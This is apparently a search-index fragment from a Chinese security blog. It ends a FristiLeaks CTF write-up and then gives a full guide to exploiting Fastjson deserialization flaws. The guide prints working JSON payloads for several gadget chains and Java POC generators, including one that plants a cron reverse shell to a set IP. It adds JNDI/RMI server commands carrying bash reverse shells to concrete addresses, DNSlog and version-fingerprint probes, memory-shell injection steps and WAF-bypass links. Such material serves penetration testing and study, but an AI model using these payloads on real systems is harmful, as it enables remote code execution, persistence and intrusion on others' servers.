src=\"/vulnhub_img/WEBRESOURCE139b4ee36b30b18f65bd8348a0cb57e5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003edamin目录下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3b7ca5dc3c6e8d5320933e91933ac112image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看样子是需要解密这串密文，还是比较好理解的，先是base64，然后rot13，想办法解开即可，这代码不难，只需要把en改成de即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0bad58714866f72484684c3d959306aeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe8915ff60022cc426fb81603a61d2aa7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x080 FristiLeaks1.3"},{"content":"一、FastJson介绍 Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将序列化的速度提升到极致，深受用户喜爱。产品主要提供两个接口 JSON.toJSONString 和 JSON.parseObject/JSON.parse 来分别实现序列化和反序列化操作。\n二、漏洞原理 fastjson的漏洞涉及几个重要概念，深入理解一些概念后才能理解为什么会出现这种情况，以及一些面试官为什么会问一些奇怪的问题，比如fastjson不出网利用、如何判断版本等；\n2.1 JNDI注入的前置知识 2.1.1 Java Bean 一类满足标准写法的类，满足以下条件的Java类可以称之为Java Bean。\n1、成员变量均使用private关键字进行修饰\n2、提供构造方法(有参/无参)\n3、为每个成员变量提供set/get方法\n2.1.2 反射 一种可以调用任意类任意方法的类；\n2.1.3 序列化和反序列化 远程数据传输，不安全的反序列化可以造成RCE；\n2.1.4 JNDI Java名称与目录服务接口，可以理解为一个强大的通讯录，可以定位用户、网络、对象、机器等等资源\n在实战利用中，常见的服务为LDAP、DNS、RMI，具体的代码实现效果为，如果lookup可控就可以导致JNDI注入\nInitialContext context = new InitialContext();\rcontext.lookup(\u0026#34;rmi://localhost:1099/HelloService\u0026#34;); 具体流程如下：\n1、目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控； 2、攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name； 3、攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； 4、目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； 5、攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；\n另外一种解释：\nJNDI支持将一个名称映射到一个Java对象,可以通过JNDI中的lookup函数向特定的提供命名服务的服务器发起查询请求获取具体对象。lookup函数可以向远程的提供目录服务的服务器发起请求查询指定对象，如果返回的是Reference类型的对象，JNDI会解析该对象的classFactory、classFactoryLocation属性。classFactory通常代表类名，classFaxtoryLocation通常代表其存储地址，JVM首先会尝试在本地寻找该类，如果本地不存在则会从classFactoryLocation(通常是一个http服务器的地址,位于远程)中进行加载，此时会触发 URLClassLoader类远程加载器，会从classFactoryLocation地址中获取远程的class文件并将其加载到JVM中。\n一些版本注入的问题：\nRMI攻击主要分3种目标：RMI Client、RMI Server、RMI Registry。\r使用远程Reference字节码进行攻击。（最初始的方式，没有任何拦截）\r从jdk8u121开始，RMI加入了反序列化白名单机制，JRMP的payload登上舞台，这里的\rpayload指的是ysoserial修改后的JRMPClient。（黑名单拦截一些类的截断）\r从jdk8u121开始，RMI远程Reference代码默认不信任，RMI远程Reference代码攻击\r方式开始失效。（直接不信任rmi）\r从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻\r击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。\r（直接不信任ldap，这以后基本都是基于本地的gadget去做复现了））\rRMI服务端执行bind，我们就可以攻击RMI Registry注册中心，导致其反序列化RCE。\rRMI客户端使用lookup方法理论上可以主动攻击RMI Registry\rRMI Registry在RMI客户端使用lookup方法的时候，可以实现被动攻击RMI客户端\r来看一下这个路程\r（1）先开始什么都没有处理，rmi开启的端口可以直接发送数据过去被反序列化\r（2）发现不对劲，所以java增加了黑名单机制（细节这里没讲），所以开始利用\rjrmp的payload（其实就是绕过了黑名单能发送数据的类）\r（3）后续rmi被不信任以后，研究人员发现了ldap也可以远程加载目录，ldap登上了\r舞台\r（4）ldap也被不信任，相当于无法远程加载，目前给的方法就是直接打过去让本\r地存在的链子命令执行，不需要像外部做加载。 高版本注入的解决办法：\n高版本JDK在RMI和LDAP的trustURLCodebase都做了限制，从默认允许远程加载ObjectFactory变成了不允许，绕过思路为：\n1、找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。\n2、利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。\nhttps://github.com/qi4L/JYso/ 老版本JRE下载：\nhttp://www.oracle.com/technetwork/java/archive-139210.html 2.1.5 RMI 远程方法调用\n任何可以被远程调用方法的对象必须实现序列化和远程接口，或者手工初始化远程对象，客户端本地必须有远程对象的接口，不然无法指定要调用的方法，而且其全限定名必须与服务器上的对象完全相同，从逻辑上可以简单的理解为调用远程对象，或者方法。\n客户端通过调用stub来远程访问服务端的对象，其中的端口和地址等由Stub负责。\n注册表机制，为了获取Stub用以正确调用远程对象而存在：\nRMIRegistry也是一个远程对象，默认监听在1099端口上\n动态加载类 RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。 2.2 Fastjosn的原理 有了前置知识后，我们大概可以明白jndi注入的原理，从实战的角度出发，那么需要几个条件：\n1、lookup函数内容可控制；\n2、目标主机可访问rmi或者ldap服务器；\n2.2.1 Fastjson中setter方法的作用 在反序列化的过程中需要为创建的对象中的成员变量进行赋值,在赋值的过程中如果成员变量是私有的,就需要调用对应成员的setter方法为其进行赋值，并且这个过程是自动调用的.\n举个例子，假如有个类叫做student:\npublic class Student {\rprivate String name;\rprivate int age;\rpublic void setName(String name){\rthis.name = name;\r}\rpublic void void setAge(int age){\rthis.age = age;\r}\rpublic String getName(){\rreturn name;\r}\rpublic int getAge(){\rreturn age;\r}\r} 在fastjosn中，正常设置该属性\nimport com.alibaba.fastjson.JSON;\rpublic class Main {\rpublic static void main(String[] args) {\rString json = \u0026#34;{\\\u0026#34;age\\\u0026#34;:20,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;Liming\\\u0026#34;}\u0026#34;;\rStudent xiaoming = JSON.parseObject(json,Student.class);\r}\r} 在这个例子中，设置对象的属性就是默认调用了对象的set方法，如果set方法中还有恶意命令，则可以造成命令执行。\n2.2.2 AutoType机制 在上一步的反序列化中，我们需要指定传入的Student.class，也就是Class字节码对象，很显然，这样子并不方便进行利用，因为需要一个已经实例化了的class对象，所以有了该机制。\nFastJson的AutoType机制支持在反序列化的过程中自动获取指定类的Class文件对象，当序列化的JSON字符串中包含@type键时就会自动将其值作为反序列化生成对象的具体类型，重点就在这里了，我们只需要传入类里面的数据就行了，不需要传输对象字节码。\nFastJson自动获取对应的Class字节码对象，从而进行反射创建实例,为对象属性赋值等操作(和正常情况一样)，唯一的区别是不用直接传递class对象了，在JSON字符串中使用@type健即可自动获取类对应的Class对象。\n所以有了这个序列化的对象：\n{\u0026#34;@type\u0026#34;:\u0026#34;Student\u0026#34;,\u0026#34;age\u0026#34;:20,\u0026#34;name\u0026#34;:\u0026#34;xiaoming\u0026#34;} 大概意思就是，会自动生成一个Student对象，并调用set方法去设置age和name。\n至此其实已经完成了fastjson的漏洞解析，接下来，无非就是利用哪条链的问题了，可以利用的链需要满足以下要求：\n1、存在set、get方法；\n2、set、get方法传参可控；\n3、传参后相关链子可用达到RCE的作用；\n4、最后是相关依赖最好比较普遍，以便于利用；\n2.3 Fastjson的利用链 3.1 com.sun.rowset.JdbcRowSetImpl利用链 这条链子其实就是上面JNDI注入的讲解，大致情况如下：\n该链的POC大概这样：\n{\u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;,\u0026#34;dataSourceName\u0026#34;:\u0026#34;ldap/rmi Server\u0026#34;, \u0026#34;autoCommit\u0026#34;:true} 代码分析：\nJdbcRowSetImpl的dataSourceName方法，该方法其实就是一个简单的赋值，核心其实就一句super.setDataSourceName(dsName): 调用父类的方法来设置数据源。\n然后是autoCommit方法，这里其实是设置是否自动提交的方法，调用conn方法去连接：\nconn方法，大概内容是判断连接是否存在，如果DataSourceName不为空，就通过jndi去查找数据源，这里有lookuo函数，就走到了jndi注入的地方：\n3.2 org.apache.tomcat.dbcp.dbcp2.BasicDataSource链 此利用链只能应用于\n3.2.1 BCEL BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。就这个库的功能来看，其使用面远不及同胞兄弟们，但是他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于com.sun.org.apache.bcel，但是注意的是在JDK- 8u251之后的BCEL中没有类加载器。\nBCEL这个包中有个类com.sun.org.apache.bcel.internal.util.ClassLoader，他是一个ClassLoader，但是他重写了Java内置的ClassLoader#loadClass()方法。 在ClassLoader#loadClass()中，其会判断类名是否是$$BCEL$$开头，如果是的话，将会对这个字符串进行decode。可以理解为是传统字节码的HEX编码，再将反斜线替换成$。默认情况下外层还会加一层GZip压缩。\n3.2.2 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 这条链子不在jdk中，使用tomcat的时候可以尝试，值得注意的是不同版本的tomcat-dbcp最后对应的payload有所不同：\nTomcat7 org.apache.tomcat.dbcp.dbcp.BasicDataSource\nTomcat8及以后 org.apache.tomcat.dbcp.dbcp2.BasicDataSource\npayload：\n{\r{\r\u0026#34;x\u0026#34;:{\r\u0026#34;@type\u0026#34;: \u0026#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\u0026#34;,\r\u0026#34;driverClassLoader\u0026#34;: {\r\u0026#34;@type\u0026#34;: \u0026#34;com.sun.org.apache.bcel.internal.util.ClassLoader\u0026#34;\r},\r\u0026#34;driverClassName\u0026#34;: \u0026#34;$$BCEL$$$l$8b$I$A$...\u0026#34;\r}\r}: \u0026#34;x\u0026#34;\r} 链子解析，在BasicDataSource中存在这方法，\n简单来说，这串代码可以让我们指定加载的对象和加载器，而driverClassName和driverClassLoader都是有set方法可以指定的。\n其实到这里，payload已经比较好认识了，首先是指定，\n当然在到达createConnectionFactory方法之前，他是被其他方法调用的，链子为getConnection()-\u0026gt;createDataSource()-\u0026gt;createConnectionFactory()，当调用toString的时候，会依次调用该类的getter方法获取值。然后会以字符串的形式输出出来。所以会调用到getConnection方法.\n但是要触发getter方法，需要让JSONObject位于JSON的key上，所以会出现两个X包裹的情况，当使用JSON.parseObject(poc);等方法反序列化中会出现。\n3.2.3 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 链 大致方法大差不差，也可以作为不出网的方法，但是条件非常苛刻，jdk版本、反序列化的格式等，都会导致漏洞无法利用；\n{\u0026#34;@type\u0026#34;:\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;,\u0026#34;_bytecodes\u0026#34;:[\u0026#34;base64\u0026#34;],\u0026#34;_name\u0026#34;:\u0026#34;a.b\u0026#34;,\u0026#34;_tfactory\u0026#34;:{ },\u0026#34;_outputProperties\u0026#34;:{ },\u0026#34;_version\u0026#34;:\u0026#34;1.0\u0026#34;,\u0026#34;allowedProtocols\u0026#34;:\u0026#34;all\u0026#34;} 3.2.4 Inet4Address dns链 {\u0026#34;b\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;ailx10.iye2ck.dnslog.cn\u0026#34;}} 3.2.5 C3P0 hexbase的链 poc代码如下，使用IDEA加载class文件即可，可用于不出网的情况，该链子还有JNDI和远程类加载\nimport com.alibaba.fastjson.JSONArray;\rimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport javax.management.BadAttributeValueExpException;\rimport java.io.ByteArrayOutputStream;\rimport java.io.IOException;\rimport java.io.ObjectOutputStream;\rimport java.lang.reflect.Field;\rimport java.nio.file.Files;\rimport java.nio.file.Paths;\rimport java.util.Base64;\rimport java.util.HashMap;\rpublic class Test {\rpublic static void main(String[] args) throws Exception {\rString hex2 = bytesToHex(tobyteArray(gen()));\rString FJ1247 = \u0026#34;{\\n\u0026#34; +\r\u0026#34; \\\u0026#34;a\\\u0026#34;:{\\n\u0026#34; +\r\u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\n\u0026#34; +\r\u0026#34; \\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\u0026#34;\\n\u0026#34; +\r\u0026#34; },\\n\u0026#34; +\r\u0026#34; \\\u0026#34;b\\\u0026#34;:{\\n\u0026#34; +\r\u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\u0026#34;,\\n\u0026#34; +\r\u0026#34; \\\u0026#34;userOverridesAsString\\\u0026#34;:\\\u0026#34;HexAsciiSerializedMap:\u0026#34; + hex2 + \u0026#34;;\\\u0026#34;,\\n\u0026#34; +\r\u0026#34; }\\n\u0026#34; +\r\u0026#34;}\\n\u0026#34;;\rSystem.out.println(FJ1247);\r}\r//FastJson原生反序列化加载恶意类字节码\rpublic static Object gen() throws Exception {\rTemplatesImpl templates = TemplatesImpl.class.newInstance();\rbyte[] bytes = Files.readAllBytes(Paths.get(\u0026#34;e:\\\\FRain.class\u0026#34;)); //刚才做好的内存马我是放在e盘下，读取其中字节即可\rsetValue(templates, \u0026#34;_bytecodes\u0026#34;, new byte[][]{bytes});\rsetValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;1\u0026#34;);\rsetValue(templates, \u0026#34;_tfactory\u0026#34;, null);\rJSONArray jsonArray = new JSONArray();\rjsonArray.add(templates);\rBadAttributeValueExpException bd = new BadAttributeValueExpException(null);\rsetValue(bd,\u0026#34;val\u0026#34;,jsonArray);\rHashMap hashMap = new HashMap();\rhashMap.put(templates,bd);\rreturn hashMap;\r}\rpublic static void setValue(Object obj, String name, Object value) throws Exception{\rField field = obj.getClass().getDeclaredField(name);\rfield.setAccessible(true);\rfield.set(obj, value);\r}\r//将类序列化为字节数组\rpublic static byte[] tobyteArray(Object o) throws IOException {\rByteArrayOutputStream bao = new ByteArrayOutputStream();\rObjectOutputStream oos = new ObjectOutputStream(bao);\roos.writeObject(o); //\rreturn bao.toByteArray();\r}\r//字节数组转十六进制\rpublic static String bytesToHex(byte[] bytes) {\rStringBuffer stringBuffer = new StringBuffer();\rfor (int i = 0; i \u0026lt; bytes.length; i++) {\rString hex = Integer.toHexString(bytes[i] \u0026amp; 0xff); //bytes[]中为带符号字节-255~+255，\u0026amp;0xff: 保证得到的数据在0~255之间\rif (hex.length()\u0026lt;2){\rstringBuffer.append(\u0026#34;0\u0026#34; + hex); //0-9 则在前面加‘0’,保证2位避免后面读取错误\r}else {\rstringBuffer.append(hex);\r}\r}\rreturn stringBuffer.toString();\r}\r} 3.2.6 commons-io写文件链 写文件利用链，常用于1.2.68及以上\n计划任务的POC：\npublic static void main(String[] args) throws Exception {\rString code = gzcompress(\u0026#34;* * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/10.30.0.84/9999 0\u0026gt;\u0026amp;1 \\n\u0026#34;);\r//\u0026lt;=1.2.68 and JDK11\rString payload = \u0026#34;{\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.AutoCloseable\\\u0026#34;,\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;sun.rmi.server.MarshalOutputStream\\\u0026#34;,\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;out\\\u0026#34;:\\r\\n\u0026#34;\r+ \u0026#34; {\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.util.zip.InflaterOutputStream\\\u0026#34;,\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;out\\\u0026#34;:\\r\\n\u0026#34;\r+ \u0026#34; {\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.io.FileOutputStream\\\u0026#34;,\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;file\\\u0026#34;:\\\u0026#34;/var/spool/cron/root\\\u0026#34;,\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;append\\\u0026#34;:false\\r\\n\u0026#34;\r+ \u0026#34; },\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;infl\\\u0026#34;:\\r\\n\u0026#34;\r+ \u0026#34; {\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;input\\\u0026#34;:\\r\\n\u0026#34;\r+ \u0026#34; {\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;array\\\u0026#34;:\\\u0026#34;\u0026#34;+code+\u0026#34;\\\u0026#34;,\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;limit\\\u0026#34;:1999\\r\\n\u0026#34;\r+ \u0026#34; }\\r\\n\u0026#34;\r+ \u0026#34; },\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;bufLen\\\u0026#34;:1048576\\r\\n\u0026#34;\r+ \u0026#34; },\\r\\n\u0026#34;\r+ \u0026#34; \\\u0026#34;protocolVersion\\\u0026#34;:1\\r\\n\u0026#34;\r+ \u0026#34;}\\r\\n\u0026#34;\r+ \u0026#34;\u0026#34;;\rSystem.out.println(payload);\rJSON.parseObject(payload);\r}\rpublic static String gzcompress(String code) {\rbyte[] data = code.getBytes();\rbyte[] output = new byte[0];\rDeflater compresser = new Deflater();\rcompresser.reset();\rcompresser.setInput(data);\rcompresser.finish();\rByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);\rtry {\rbyte[] buf = new byte[1024];\rwhile (!compresser.finished()) {\rint i = compresser.deflate(buf);\rbos.write(buf, 0, i);\r}\routput = bos.toByteArray();\r} catch (Exception e) {\routput = data;\re.printStackTrace();\r} finally {\rtry {\rbos.close();\r} catch (IOException e) {\re.printStackTrace();\r}\r}\rcompresser.end();\rSystem.out.println(Arrays.toString(output));\rreturn Base64.getEncoder().encodeToString(output);\r} payload:\n{\r\u0026#34;\\u0040\\u0074\\u0079\\u0070\\u0065\u0026#34;:\u0026#34;java.lang.AutoCloseable\u0026#34;,\r\u0026#34;\\u0040\\u0074\\u0079\\u0070\\u0065\u0026#34;:\u0026#34;sun.rmi.server.MarshalOutputStream\u0026#34;,\r\u0026#34;out\u0026#34;:\r{\r\u0026#34;\\u0040\\u0074\\u0079\\u0070\\u0065\u0026#34;:\u0026#34;java.util.zip.InflaterOutputStream\u0026#34;,\r\u0026#34;out\u0026#34;:\r{\r\u0026#34;\\u0040\\u0074\\u0079\\u0070\\u0065\u0026#34;:\u0026#34;java.io.FileOutputStream\u0026#34;,\r\u0026#34;file\u0026#34;:\u0026#34;/var/spool/cron/root\u0026#34;,\r\u0026#34;append\u0026#34;:false\r},\r\u0026#34;infl\u0026#34;:\r{\r\u0026#34;input\u0026#34;:\r{\r\u0026#34;array\u0026#34;:\u0026#34;eJzTUtCCQoWkxOIMBd1MBTs1Bf2U1DL9kuQCfUMDPWMDPQM9CxN9SyBQMLBTM1TgAgBAXQuq\u0026#34;,\r\u0026#34;limit\u0026#34;:1999\r}\r},\r\u0026#34;bufLen\u0026#34;:1048576\r},\r\u0026#34;protocolVersion\u0026#34;:1\r} 最后还要修改\n3.2.7 Groovy 链 该链普遍认为是fastjson1.2.76-1.2.80较为可能达成的链子。\npoc:\n1、\n{\r\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Exception\u0026#34;,\r\u0026#34;@type\u0026#34;:\u0026#34;org.codehaus.groovy.control.CompilationFailedException\u0026#34;,\r\u0026#34;unit\u0026#34;:{}\r} 2、\n{\r\u0026#34;@type\u0026#34;:\u0026#34;org.codehaus.groovy.control.ProcessingUnit\u0026#34;,\r\u0026#34;@type\u0026#34;:\u0026#34;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\u0026#34;,\r\u0026#34;config\u0026#34;:{\r\u0026#34;@type\u0026#34;:\u0026#34;org.codehaus.groovy.control.CompilerConfiguration\u0026#34;,\r\u0026#34;classpathList\u0026#34;:\u0026#34;http://127.0.0.1:81/attack-1.jar\u0026#34;\r}\r} 还有其他链可以参考下文\n三、漏洞利用 https://github.com/safe6Sec/Fastjson\nhttps://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md\nFastJson漏洞，从2017年爆出以来，从最初的1.2.24版本到比较新的1.2.83 2022年，已经经历了较多版本，1.2.24之前版本可以做到通杀，且没黑白名单机制，而后在1.2.25中设置了默认不开启 autotype，1.2.47出现了不开启autotype的利用方式，且通杀。 基于漫长的历史时间，不同的版本存在不同的黑白名单机制，利用链也天差地别，所以黑盒测试中确定FastJson版本可能是能决定是否能成功利用的关键动作之一。\n除开报错直接返回准确版本之外，探测方式主要为两种：一种为延迟探测，一种为DNSlog探测，这里只记录几个关键RCE版本\n四、DNS探测 可用于探测是否访问DNS，但无法确定是否存在反序列化\n{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;http://dnslog\u0026#34;}\r{{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;http://dnslog\u0026#34;}:\u0026#34;x\u0026#34;}\r{\u0026#34;@type\u0026#34;:\u0026#34;java.net.InetAddress\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}\r{\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}\r{\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet6Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}\r{{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}:\u0026#34;aaa\u0026#34;}\r{\u0026#34;@type\u0026#34;:\u0026#34;com.alibaba.fastjson.JSONObject\u0026#34;, {\u0026#34;@type\u0026#34;: \u0026#34;java.net.URL\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;http://dnslog\u0026#34;}}\u0026#34;\u0026#34;}\rSet[{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;http://dnslog\u0026#34;}]\rSet[{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;http://dnslog\u0026#34;}\r{\u0026#34;@type\u0026#34;:\u0026#34;java.net.InetSocketAddress\u0026#34;{\u0026#34;address\u0026#34;:,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}}\r{{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;http://dnslog\u0026#34;}:0 五、不出网利用 前言：不出网利用，通常是\n1、写静态文件\n2、写webshell，前提知道路径\n3、内存马\n4、dns外带\n5、利用tomcat\\Spring等中间件进行回显\n常见的可用链：\n1、BasicDataSource链\r2、C3P0 hexbase的链\r3、TemplatesImpl链\r4、commons-io写webshell 或者读一些敏感文件 六、自动化工具复现 java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 \u0026ldquo;bash -i \u0026gt;\u0026amp;/dev/tcp/192.168.2.40/9999 0\u0026gt;\u0026amp;1\u0026rdquo;\njava -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 \u0026ldquo;bash -i \u0026gt;\u0026amp;/dev/tcp/1.14.74.119/8888 0\u0026gt;\u0026amp;1\u0026rdquo;\n恶意类启动建议使用：\nhttps://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/jndi_tool.jar POC建议使用：\nhttps://github.com/zhzyker/exphub/tree/946405b3447dbaf2a5eb49e2f56ec33fe1165e49/fastjson 值得注意的几个大版本，1.2.24 通杀、1.2.47 ，这两个可以进行JNDI注入反弹shell，1.2.68版本很难使用JNDI注入了，所以常用写文件的方式进行RCE，1.2.80版本同理，受益于浅蓝大佬的公开，得以使用，但实战利用条件同样苛刻。\n七、内存马注入 1、JNDI注入内存马： 生成哥斯拉内存马：\n开启http服务：\n开启rmi服务，注意最好使用jdk 8\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \u0026#34;http://192.168.5.106:8888/#a\u0026#34; 9999 添加密码和密钥,Referer:连接即可：\n2、C3P0 内存马注入 参见3.2.5\n3、BCEL注入 4、写文件charsets.jar注入 这种方法属于是对计划任务不出网的一种补充，但是实操难度较高。\nhttps://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks\n5、classes https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/\n八、FastJsonParty https://github.com/lemono0/FastJsonParty\n该靶场是目前fastjson的集大成内容，主要涉及各大利用链、版本识别、版本绕过等。\n九、fastjson的识别，这里只探讨识别，不涉及版本判断 1、当返回的内容中带有fastjson字样时判断为使用了fastjson，这种应该是框架抛出的；\n2、当报错格式大概为以下格式的时候，很大程度可能使用了fastjson；\n3、type=Internal Server Error, status=500，这种也是框架抛出的\n4、一些特殊的payload\n该payload可能导致抛出fastjson版本：\n{\u0026#34;@type\u0026#34;: \u0026#34;java.lang.AutoCloseable\u0026#34;\r[\u0026#34;test\u0026#34;:1] 解码hex和unicode编码\n{\u0026#34;\\u0040\\u0074\\u0079\\u0070\\u0065\u0026#34;: \u0026#34;\\u006A\\u0061\\u0076\\u0061\\u002E\\u006C\\u0061\\u006E\\u0067\\u002E\\u0041\\u0075\\u0074\\u006F\\u0043\\u006C\\u006F\\u0073\\u0065\\u0061\\u0062\\u006C\\u0065\u0026#34; 5、这个payload 可能出现 autoType is not support. whatever\n{\u0026#34;@type\u0026#34;:\u0026#34;whatever\u0026#34;} 十、其他 依赖链判断方法：\n{\r\u0026#34;x\u0026#34;: {\r\u0026#34;@type\u0026#34;: \u0026#34;java.lang.Character\u0026#34;{\r\u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;,\r\u0026#34;val\u0026#34;: \u0026#34;org.springframework.web.bind.annotation.RequestMapping\u0026#34;\r}\r} 绕过：\nhttps://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/ ","permalink":"https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/","summary":"\u003ch1 id=\"一fastjson介绍\"\u003e一、FastJson介绍\u003c/h1\u003e\n\u003cp\u003eFastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将序列化的速度提升到极致，深受用户喜爱。产品主要提供两个接口 JSON.toJSONString 和 JSON.parseObject/JSON.parse 来分别实现序列化和反序列化操作。\u003c/p\u003e\n\u003ch1 id=\"二漏洞原理\"\u003e二、漏洞原理\u003c/h1\u003e\n\u003cp\u003efastjson的漏洞涉及几个重要概念，深入理解一些概念后才能理解为什么会出现这种情况，以及一些面试官为什么会问一些奇怪的问题，比如fastjson不出网利用、如何判断版本等；\u003c/p\u003e\n\u003ch2 id=\"21-jndi注入的前置知识\"\u003e2.1 JNDI注入的前置知识\u003c/h2\u003e\n\u003ch3 id=\"211-java-bean\"\u003e2.1.1 Java Bean\u003c/h3\u003e\n\u003cp\u003e一类满足标准写法的类，满足以下条件的Java类可以称之为Java Bean。\u003c/p\u003e\n\u003cp\u003e1、成员变量均使用private关键字进行修饰\u003c/p\u003e\n\u003cp\u003e2、提供构造方法(有参/无参)\u003c/p\u003e\n\u003cp\u003e3、为每个成员变量提供set/get方法\u003c/p\u003e\n\u003ch3 id=\"212-反射\"\u003e2.1.2 反射\u003c/h3\u003e\n\u003cp\u003e一种可以调用任意类任意方法的类；\u003c/p\u003e\n\u003ch3 id=\"213-序列化和反序列化\"\u003e2.1.3 序列化和反序列化\u003c/h3\u003e\n\u003cp\u003e远程数据传输，不安全的反序列化可以造成RCE；\u003c/p\u003e\n\u003ch3 id=\"214-jndi\"\u003e2.1.4 